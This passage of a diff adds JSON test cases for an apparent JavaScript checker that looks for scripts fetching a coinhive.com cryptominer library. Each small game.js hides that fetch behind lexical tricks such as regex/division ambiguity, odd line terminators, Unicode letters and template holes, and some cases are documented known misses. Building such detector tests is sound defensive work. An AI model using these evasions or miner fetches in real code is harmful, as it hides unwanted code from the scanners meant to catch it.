+      "why": "was known_miss_line_comment_between_dot_and_keyword: a // comment between . and return makes return a property, and nothing reading backwards can see where a line comment began, so a line break before a keyword now means it may be one (review R33c)",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a={return:2};var z=a.// c\nreturn/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33c_b1_line_break_before_division",
+      "verdict": "blocker",
+      "why": "was known_miss_line_break_before_division: a / at the start of a line after a value is division, and every / after a line break used to be read as a pattern; a line break in front now means either reading (review R33c)",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a=2;var z=a\n/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33c_n3_string_ends_at_cr",
+      "verdict": "blocker",
+      "why": "review R33c, pinning R33b N3: a quote that opens nothing real stops at a bare CR as it does at LF; the sink pass met one inside a comment, and a string run past the CR paired with the wrong quotes and marked the fetch inert",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "//console.log('\rvar t='x',u=fetch(\"https://coinhive.com/lib/x.js\"),v=')';"
+      }
+    },
+    {
+      "id": "r33c_n3_backslash_crlf_is_one_continuation",
+      "verdict": "blocker",
+      "why": "review R33c, pinning R33b N3: a backslash before CRLF continues the string over both characters; stepping over the CR alone ended the string at the LF and read the // in it as a comment over the fetch",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var s='a\\\r\n//';fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_n3_pattern_ends_at_cr",
+      "verdict": "blocker",
+      "why": "review R33c, pinning R33b N3: a pattern cannot hold a line terminator, so one the walk opened by mistake stops at cr as at LF; past it, the pattern ran on to the / of https:// (the misread itself is known_miss_division_after_object_literal)",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var z={}/1\rfetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_n3_pattern_ends_at_line_separator",
+      "verdict": "blocker",
+      "why": "review R33c, pinning R33b N3: a pattern cannot hold a line terminator, so one the walk opened by mistake stops at line separator as at LF; past it, the pattern ran on to the / of https:// (the misread itself is known_miss_division_after_object_literal)",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var z={}/1 fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_n3_pattern_ends_at_paragraph_separator",
+      "verdict": "blocker",
+      "why": "review R33c, pinning R33b N3: a pattern cannot hold a line terminator, so one the walk opened by mistake stops at paragraph separator as at LF; past it, the pattern ran on to the / of https:// (the misread itself is known_miss_division_after_object_literal)",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var z={}/1 fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_n3_shader_comment_ends_at_cr",
+      "verdict": "blocker",
+      "why": "review R33c, pinning R33b N3: a // comment in a template ends at cr as at LF, so the URL on the next line of the template is live (JavaScript reads that CR as LF inside the template, which is why the split is on \\n)",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var u=`// note\rhttps://coinhive.com/lib/x.js`.split(\"\\n\")[1];fetch(u);"
+      }
+    },
+    {
+      "id": "r33c_n3_shader_comment_ends_at_line_separator",
+      "verdict": "blocker",
+      "why": "review R33c, pinning R33b N3: a // comment in a template ends at line separator as at LF, so the URL on the next line of the template is live",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var u=`// note https://coinhive.com/lib/x.js`.split(\" \")[1];fetch(u);"
+      }
+    },
+    {
+      "id": "r33c_b1_pattern_after_a_line_ending_in_a_comment",
+      "verdict": "blocker",
+      "why": "review R33c B1: a line break in front of a / means either reading, because the line may end in a // comment whose last character settles nothing; here the comment ends in a word, division met // inside the pattern on the next line, and the request after it was hidden",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var r=[ // a list\n/a\\//];fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_extends_takes_a_pattern",
+      "verdict": "blocker",
+      "why": "review R33c, beyond its list: extends takes an expression, so a / after it opens a pattern; read as division it met // inside the pattern",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "class A extends /\\//.constructor{};fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_spread_takes_a_pattern",
+      "verdict": "blocker",
+      "why": "review R33c, beyond its list: a spread takes an expression, so a / after ... opens a pattern",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "if(0)Math.max(.../\\//);fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_postfix_increment_then_division",
+      "verdict": "blocker",
+      "why": "review R33c, beyond its list: a / after ++ is division after a++ and a pattern after a+++, so both are walked; read as a pattern it ran to the / of https://",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a=1,b=a++/2;fetch(\"https://coinhive.com/lib/x.js\");var c=1/1;"
+      }
+    },
+    {
+      "id": "r33c_export_default_takes_a_pattern",
+      "verdict": "blocker",
+      "why": "review R33c, beyond its list: export default takes an expression in a module",
+      "files": {
+        "index.html": "<!doctype html><script type=\"module\" src=\"game.js\"></script>",
+        "game.js": "export default /\\//;fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "r33c_braced_escape_with_leading_zeros",
+      "verdict": "blocker",
+      "why": "review R33c, beyond its list: JavaScript allows any number of leading zeros in \\u{...}, so this is one name and not the keyword return",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var x\\u{000000000061}return=2;var z=x\\u{000000000061}return/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33c_d1_astral_letter_before_keyword",
+      "verdict": "blocker",
+      "why": "review R33c D1: a letter past U+FFFF is part of the name, and the preflight, reading UTF-16 halves, took return for the keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var 𝒜return=2;var z=𝒜return/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33c_d1_astral_letter_inside_a_name",
+      "verdict": "blocker",
+      "why": "review R33c D1: the same in the middle of a name",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var x𝒜return=2;var z=x𝒜return/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33c_d1_unicode_16_letter",
+      "verdict": "blocker",
+      "why": "review R33c D1: U+A7CB is a letter in Unicode 16, which the pipeline Python does not know, so it took return for the keyword",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var Ɤreturn=2;var z=Ɤreturn/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33c_d1_unicode_16_cyrillic",
+      "verdict": "blocker",
+      "why": "review R33c D1: the same with U+1C89",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var Ᲊreturn=2;var z=Ᲊreturn/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "r33d_hole_gives_up_once_the_budget_is_spent",
+      "verdict": "blocker",
+      "why": "review R33d: fifty nested holes after of, each guess reading to the end of the line, spend the file budget; once it is spent there is no guess left to make, so a hole that needs one runs to the end of the text and nothing after it is recorded. Read as division instead, the } inside the long pattern closed the hole and [// hid the request",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var of=1,s=`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[`${of/[1]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`]}`;\nasync function f(){return `${await /aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}[//]x/,fetch(\"https://coinhive.com/lib/x.js\")}`}"
+      }
+    },
+    {
+      "id": "r33d_budget_counts_utf16_units_in_both",
+      "verdict": "pass",
+      "why": "review R33d: the budget is counted in UTF-16 units by both checkers. A thousand emoji are two thousand units to the preflight and were a thousand code points to inert.py, so this file walked to the end in one and ran out of budget in the other, where the comment URL after it went live. The of/[( run is legal only to the walk, which is all this asks about",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "/* 😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀😀 */\nvar of;of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(of/[(]/;\n// https://coinhive.com/lib/x.js\n"
+      }
+    },
+    {
+      "id": "known_miss_pattern_after_if_head",
+      "verdict": "pass",
+      "why": "KNOWN MISS (found fixing R33b, 27 Oct 2026, present before it): a / after the ) of an if or while head opens a pattern, and the walk reads every / after ) as division, so the // inside the pattern hides the line. Pinned at pass so a fix flips it on purpose.",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var s=\"\";if(s)/\\//.test(s);fetch(\"https://coinhive.com/lib/x.js\");"
+      }
+    },
+    {
+      "id": "known_miss_hole_guess_short",
+      "verdict": "pass",
+      "why": "KNOWN MISS (review R33c, 27 Oct 2026, present before R33b): a ${} hole can follow one reading only, and after await a pattern holding ( is guessed to be division, so the } inside it closes the hole and [// opens a shader comment over the request. The whole class: the hole guess steps back over spaces and tabs only, so a comment, a no-break space or a line separator before a / makes it say division after any keyword or punctuation, and of, await or yield as plain names in a classic script can make it say pattern where JavaScript divides; one KNOWN MISS row per trigger sits beside this one. A fix needs both readings at the template level. Pinned at pass so a fix flips it on purpose.",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "async function f(){return `${await /(})[//]x/,fetch(\"https://coinhive.com/lib/x.js\")}`}"
+      }
+    },
+    {
+      "id": "known_miss_hole_guess_long",
+      "verdict": "pass",
+      "why": "KNOWN MISS (review R33c, 27 Oct 2026, present before R33b): the other direction of the same guess. A / after a line break in a hole is guessed to be a pattern, so a division there carries the hole past its own } and a // in the template text after it reads as a comment over the request. The whole class: the hole guess steps back over spaces and tabs only, so a comment, a no-break space or a line separator before a / makes it say division after any keyword or punctuation, and of, await or yield as plain names in a classic script can make it say pattern where JavaScript divides; one KNOWN MISS row per trigger sits beside this one. A fix needs both readings at the template level. Pinned at pass so a fix flips it on purpose.",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a=2,s=`${a\n/2}x/ //`;fetch(\"https://coinhive.com/lib/x.js\");`}`;"
+      }
+    },
+    {
+      "id": "known_miss_division_after_object_literal",
+      "verdict": "pass",
+      "why": "KNOWN MISS (review R33c, 27 Oct 2026, present before R33b): a / after } is read as a pattern, which is right after a block and wrong after an object literal, so {}/1 opened a pattern that ran to the / of https://. Taking both readings after every } costs real libraries precision and was not measured. Pinned at pass so a fix flips it on purpose.",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var z={}/1;fetch(\"https://coinhive.com/lib/x.js\");var q=1/1;"
+      }
+    },
+    {
+      "id": "known_miss_annex_b_comment_opens_a_template",
+      "verdict": "pass",
+      "why": "KNOWN MISS (review R33c, 27 Oct 2026, present before R33b): <!-- opens a line comment in a classic script, and the walk does not know it, so the backtick in the comment opened a template and the /* in that hid the request on the next line. Reading <!-- as a comment would hide code in a module, where it is an operator. Pinned at pass so a fix flips it on purpose.",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var a=1;<!-- `/*\nfetch(\"https://coinhive.com/lib/x.js\");\n<!-- `\n"
+      }
+    },
+    {
+      "id": "known_miss_hole_guess_comment_before_pattern",
+      "verdict": "pass",
+      "why": "KNOWN MISS (review R33d, 27 Oct 2026, present before R33b): a block comment between typeof and a pattern in a ${} hole lands the guess on the comment, which settles nothing, so it says division; the } in the pattern closes the hole and [// hides the request. The hole guess keeps the rule from before R33b, which steps back over spaces and tabs only, and needs both readings at the template level to fix. Pinned at pass so that fix flips it on purpose.",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var s=`${typeof/**//(})[//]x/,fetch(\"https://coinhive.com/lib/x.js\")}`;"
+      }
+    },
+    {
+      "id": "known_miss_hole_guess_no_break_space_before_pattern",
+      "verdict": "pass",
+      "why": "KNOWN MISS (review R33d, 27 Oct 2026, present before R33b): a no-break space between ( and a pattern in a hole does the same after punctuation. The hole guess keeps the rule from before R33b, which steps back over spaces and tabs only, and needs both readings at the template level to fix. Pinned at pass so that fix flips it on purpose.",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var s=`${( /(})[//]x/,fetch(\"https://coinhive.com/lib/x.js\"))}`;"
+      }
+    },
+    {
+      "id": "known_miss_hole_guess_line_separator_before_pattern",
+      "verdict": "pass",
+      "why": "KNOWN MISS (review R33d, 27 Oct 2026, present before R33b): a U+2028 line separator between typeof and a pattern in a hole does the same. The hole guess keeps the rule from before R33b, which steps back over spaces and tabs only, and needs both readings at the template level to fix. Pinned at pass so that fix flips it on purpose.",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var s=`${typeof /(})[//]x/,fetch(\"https://coinhive.com/lib/x.js\")}`;"
+      }
+    },
+    {
+      "id": "known_miss_hole_guess_of_as_a_name",
+      "verdict": "pass",
+      "why": "KNOWN MISS (review R33d, 27 Oct 2026, present before R33b): of is a plain name in a classic script, so of/2 divides, but the guess reads /2}x/ as a pattern because it closes holding no quote or parenthesis; the hole runs past its own } and the // in the template text after it reads as a comment over the request. The hole guess keeps the rule from before R33b, which steps back over spaces and tabs only, and needs both readings at the template level to fix. Pinned at pass so that fix flips it on purpose.",
+      "files": {
+        "index.html": "<!doctype html><script src=\"game.js\"></script>",
+        "game.js": "var of=2,s=`${of/2}x/ //`;fetch(\"https://coinhive.com/lib/x.js\");`}`;"
+      }
+    }
+  ]
+}
